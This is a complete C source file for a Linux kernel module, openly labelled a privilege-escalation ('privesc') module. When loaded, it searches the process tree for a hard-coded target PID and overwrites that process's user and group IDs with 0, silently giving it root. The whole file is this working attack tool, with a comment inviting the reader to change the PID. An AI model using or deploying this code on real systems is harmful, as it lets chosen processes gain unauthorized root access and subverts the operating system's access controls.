#include <linux/module.h>
#include <linux/kernel.h>
// #include <linux/sched.h>
#include <linux/sched/task.h>
#include <linux/init.h>
#include <linux/cred.h>

const int target_pid = 22577; // <<-- CHANGE ME TO DESIRED PID TO PRIVESC
/**
 * Performs a DFS on a given task's children.
 *
 * @void
 */
void DFS(struct task_struct *task)
{   
    struct task_struct *child;
    struct list_head *list;

    // printk("name: %s, pid: [%d], state: %li UID:%d\n", task->comm, task->pid, task->state, task->cred->uid.val);
    if (task->pid == target_pid)
    {
    	printk("pid %d found, PRIVESC TIME!", target_pid);

    	int* uid = &(task->cred->uid.val);
    	int* euid = &(task->cred->euid.val);
    	int* gid = &(task->cred->gid.val);
    	int* egid = &(task->cred->egid.val);
    	*uid = 0;
    	*euid = 0;
    	*gid = 0;
    	*egid = 0;
	}
    list_for_each(list, &task->children) {
        child = list_entry(list, struct task_struct, sibling);
        DFS(child);
    }
}

/**
 * This function is called when the module is loaded. 
 *
 * @return 0  upon success
 */ 
int task_lister_init(void)
{
    printk(KERN_INFO "Loading Task Privesc Module...\n");
    DFS(&init_task);

    return 0;
}

/**
 * This function is called when the module is removed.
 *
 * @void
 */
void task_lister_exit(void)
{
    printk(KERN_INFO "Removing Task Privesc Module...\n");
}

// Macros for registering module entry and exit points.
module_init(task_lister_init);
module_exit(task_lister_exit);